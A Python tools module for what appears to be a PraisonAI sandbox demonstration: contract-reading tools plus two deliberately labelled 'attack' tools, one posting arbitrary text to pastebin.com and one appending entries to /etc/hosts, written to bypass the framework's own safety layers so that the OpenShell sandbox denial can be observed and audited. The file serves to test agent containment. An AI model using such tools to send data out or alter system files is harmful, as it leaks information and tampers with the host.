"""Tools for the contract risk review team.

``list_contracts``, ``read_contract`` and ``load_policy`` only read files that
ship with the example.

``publish_to_pastebin`` and ``add_hosts_entry`` are deliberate "attack" tools.
They use raw ``urllib`` / ``open()`` and skip PraisonAI's own safety layers
(for example ``FileTools`` refuses paths outside the workspace), so any denial
you see comes from the OpenShell sandbox policy, not from PraisonAI. Each call
is appended to ``audit.jsonl`` next to this file.
"""

import json
import time
import urllib.parse
import urllib.request
from pathlib import Path

BASE_DIR = Path(__file__).resolve().parent
CONTRACTS_DIR = BASE_DIR / "contracts"
POLICY_FILE = BASE_DIR / "policy" / "procurement_policy.md"
AUDIT_FILE = BASE_DIR / "audit.jsonl"

PASTEBIN_URL = "https://pastebin.com/api/api_post.php"
HOSTS_FILE = "/etc/hosts"


def _audit(tool: str, target: str, outcome: str, error: str = "") -> None:
    entry = {"ts": time.time(), "tool": tool, "target": target, "outcome": outcome, "error": error}
    with AUDIT_FILE.open("a", encoding="utf-8") as f:
        f.write(json.dumps(entry) + "\n")


def list_contracts() -> str:
    """List the vendor contract file names available for review."""
    return "\n".join(sorted(p.name for p in CONTRACTS_DIR.glob("*.md")))


def read_contract(name: str) -> str:
    """Return the full text of one vendor contract, e.g. read_contract('vendor_a.md')."""
    path = (CONTRACTS_DIR / Path(name).name).resolve()
    if path.parent != CONTRACTS_DIR or not path.is_file():
        return f"Unknown contract: {name}. Available: {list_contracts()}"
    return path.read_text(encoding="utf-8")


def load_policy() -> str:
    """Return the procurement policy with rules P1-P6 and their severities."""
    return POLICY_FILE.read_text(encoding="utf-8")


def publish_to_pastebin(content: str) -> str:
    """Publish the report text to pastebin.com and return the paste URL."""
    data = urllib.parse.urlencode({"api_option": "paste", "api_paste_code": content}).encode()
    try:
        with urllib.request.urlopen(urllib.request.Request(PASTEBIN_URL, data=data), timeout=15) as resp:
            body = resp.read(200).decode(errors="replace")
        _audit("publish_to_pastebin", PASTEBIN_URL, "allowed", "")
        return f"Published: HTTP {resp.status} {body}"
    except Exception as exc:  # the sandbox is expected to deny this
        error = f"{type(exc).__name__}: {exc}"
        _audit("publish_to_pastebin", PASTEBIN_URL, "denied", error)
        return f"publish_to_pastebin failed: {error}"


def add_hosts_entry(hostname: str) -> str:
    """Register a hostname by appending '127.0.0.1 <hostname>' to /etc/hosts."""
    try:
        with open(HOSTS_FILE, "a", encoding="utf-8") as f:
            f.write(f"127.0.0.1 {hostname}\n")
        _audit("add_hosts_entry", HOSTS_FILE, "allowed", "")
        return f"Added {hostname} to {HOSTS_FILE}"
    except Exception as exc:  # the sandbox is expected to deny this
        error = f"{type(exc).__name__}: {exc}"
        _audit("add_hosts_entry", HOSTS_FILE, "denied", error)
        return f"add_hosts_entry failed: {error}"
